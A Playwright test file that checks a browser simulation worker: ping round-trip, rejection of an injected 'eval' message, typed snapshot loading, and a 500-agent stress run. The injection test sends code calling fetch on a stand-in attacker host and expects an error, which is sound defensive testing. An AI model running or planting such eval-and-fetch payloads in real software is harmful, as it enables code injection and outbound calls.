import { expect, test } from '@playwright/test';
import { freeRoad } from '../../src/scenarios/presets';

test('real browser module worker round-trips ping, rejects injection and loads typed snapshots', async ({ page }) => {
  await page.goto('/');
  const result = await page.evaluate(async scenario => {
    const worker = new Worker('/simulation.worker.js', { type: 'module' });
    const request = (input: unknown): Promise<Record<string, unknown>> => new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('Worker response timed out')), 5000);
      worker.onmessage = event => { clearTimeout(timeout); resolve(event.data); };
      worker.onerror = event => { clearTimeout(timeout); reject(new Error(event.message)); };
      worker.postMessage(input);
    });
    try {
      const ping = await request({ type: 'ping', requestId: 'browser-round-trip' });
      const attack = await request({ type: 'eval', code: 'fetch("https://attacker.invalid")' });
      const frame = await request({ type: 'load', scenario });
      return { ping, attackType: attack.type, frameType: frame.type, typedArray: frame.states instanceof Float32Array };
    } finally { worker.terminate(); }
  }, freeRoad());
  expect(result).toEqual({ ping: { type: 'pong', requestId: 'browser-round-trip' }, attackType: 'error', frameType: 'frame', typedArray: true });
});

test('real worker keeps 500+ agents finite, conserves arrivals and resets cleanly', async ({ page }) => {
  test.setTimeout(30000); await page.goto('/');
  const s = freeRoad(); s.duration = 600; s.edges[0].lanes = 6; s.edges[0].width = 21; s.demand[0].rate = 7200;
  const result = await page.evaluate(async scenario => {
    const worker = new Worker('/simulation.worker.js', { type: 'module' });
    interface Frame { type: string; states: Float32Array; metrics: { time: number; moving: number; generated: number; active: number; completed: number; rejected: number } }
    const request = (input: unknown): Promise<Frame> => new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('Worker response timed out')), 10000);
      worker.onmessage = event => { clearTimeout(timeout); resolve(event.data); };
      worker.onerror = event => { clearTimeout(timeout); reject(new Error(event.message)); };
      worker.postMessage(input);
    });
    try {
      let frame = await request({ type: 'load', scenario });
      for (let i = 0; i < 15; i++) frame = await request({ type: 'step', count: 600 });
      const { metrics: m, states } = frame;
      const reset = await request({ type: 'load', scenario });
      return { moving: m.moving, time: m.time, conserved: m.generated === m.active + m.completed + m.rejected, finite: [...states].every(Number.isFinite), packedLength: states.length, resetTime: reset.metrics.time };
    } finally { worker.terminate(); }
  }, s);
  expect(result.moving).toBeGreaterThanOrEqual(500); expect(result.time).toBe(300); expect(result.conserved).toBe(true); expect(result.finite).toBe(true); expect(result.packedLength).toBe(result.moving * 9); expect(result.resetTime).toBe(0);
});
